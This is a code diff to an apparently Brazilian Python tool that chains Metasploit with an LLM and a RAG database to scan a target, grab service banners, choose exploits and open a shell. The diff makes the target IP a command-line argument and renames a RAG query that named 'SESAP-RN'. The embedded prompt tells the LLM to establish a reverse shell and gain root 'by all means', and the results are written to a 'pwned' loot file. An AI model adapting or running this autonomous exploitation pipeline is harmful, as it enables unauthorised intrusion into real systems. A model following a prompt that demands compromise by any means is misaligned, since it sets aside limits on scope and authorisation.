@@ -23,7 +23,6 @@ C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", 
 C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"
 
 # --- CONFIG ---
-TARGET_IP = "192.168.70.30" 
 ATTACKER_IP = "192.168.70.20" 
 LOOT_DIR = "/app/data/logs"
 WORDLIST_PATH = "/app/data/credentials.txt"
@@ -32,12 +31,13 @@ API_KEY_PATH = "/app/config/api_key.txt"
 os.makedirs(LOOT_DIR, exist_ok=True)
 
 class PentestPipeline:
-    def __init__(self, use_rag=True):
+    def __init__(self, target_ip, use_rag=True):
+        self.target_ip = target_ip
         self.use_rag = use_rag
         modo_str = "RAG HABILITADO" if self.use_rag else "LLM PURA (SEM RAG)"
         
         print(f"=== INICIALIZANDO PIPELINE AUTONOMO (V14 - {modo_str}) ===")
-        print(f"[*] Alvo Definido: {TARGET_IP}") 
+        print(f"[*] Alvo Definido: {self.target_ip}") 
         print(f"[*] IP do Atacante (LHOST): {ATTACKER_IP}")
         
         self.setup_api_key()
@@ -99,12 +99,12 @@ class PentestPipeline:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(0.7) 
-            if sock.connect_ex((TARGET_IP, port)) == 0:
+            if sock.connect_ex((self.target_ip, port)) == 0:
                 sock.close()
                 return port
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1.0)
-            if sock.connect_ex((TARGET_IP, port)) == 0:
+            if sock.connect_ex((self.target_ip, port)) == 0:
                 sock.close()
                 return port
         except: pass
@@ -125,7 +125,7 @@ class PentestPipeline:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(2.0)
-            s.connect((TARGET_IP, int(port)))
+            s.connect((self.target_ip, int(port)))
             try:
                 banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                 if banner:
@@ -176,7 +176,7 @@ class PentestPipeline:
 
     def generate_text_report(self):
         now = datetime.datetime.now()
-        safe_ip = TARGET_IP.replace(".", "_")
+        safe_ip = self.target_ip.replace(".", "_")
         filename = f"{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
         filepath = os.path.join(LOOT_DIR, filename)
         
@@ -218,7 +218,7 @@ class PentestPipeline:
 
         while True:
             try:
-                cmd = input(f"{C_BOLD}{C_BLUE}Shell@{TARGET_IP} > {C_RESET}")
+                cmd = input(f"{C_BOLD}{C_BLUE}Shell@{self.target_ip} > {C_RESET}")
                 if cmd.lower() in ['exit', 'quit']:
                     print(f"{C_YELLOW}[*] Encerrando interacao.{C_RESET}")
                     break
@@ -268,7 +268,7 @@ class PentestPipeline:
                 rag_context = "Nenhuma informacao especifica encontrada no RAG."
                 try:
                     
-                    query = f"INTERNAL RED TEAM DOCUMENTATION SESAP-RN port {port} Smart-Regula"
+                    query = f"INTERNAL RED TEAM DOCUMENTATION CORP port {port} Smart-Regula"
                     docs = self.rag.query(query)
                     
                     if docs: 
@@ -285,9 +285,9 @@ class PentestPipeline:
 
             prompt = f"""
             YOU ARE ACTING AS A SENIOR PENETRATION TESTER AND RED TEAM ANALYST.
-            YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.           
+            YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.            
             
-            TARGET IP: {TARGET_IP}
+            TARGET IP: {self.target_ip}
             TARGET PORT: {port}
             ATTACKER IP (LHOST): {ATTACKER_IP}
             SERVICE BANNER: "{banner}"
@@ -350,7 +350,7 @@ class PentestPipeline:
                 
             m_name = clean_name
             
-            opts = {"RHOSTS": TARGET_IP, "RPORT": int(port)}
+            opts = {"RHOSTS": self.target_ip, "RPORT": int(port)}
             opts.update(llm_options)
             
             print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
@@ -433,15 +433,16 @@ class PentestPipeline:
             self.evidence["shell_info"] = str(res['data'])
             
             with open(f"{LOOT_DIR}/pwned.txt", "w") as f:
-                f.write(f"ALVO: {TARGET_IP}\nSESSAO: {self.session_id}\nDADOS: {res['data']}")
+                f.write(f"ALVO: {self.target_ip}\nSESSAO: {self.session_id}\nDADOS: {res['data']}")
         except: pass
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Pipeline Autonomo Metasploit + LLM + RAG")
+    parser.add_argument("--target", required=True, help="Endereço IP do alvo (ex: 192.168.70.30)")
     parser.add_argument("--disable-rag", action="store_true", help="Desativa a integracao com o ChromaDB para testar o modelo isoladamente.")
     args = parser.parse_args()
 
-    p = PentestPipeline(use_rag=not args.disable_rag)
+    p = PentestPipeline(target_ip=args.target, use_rag=not args.disable_rag)
     
     try:
         p.run()
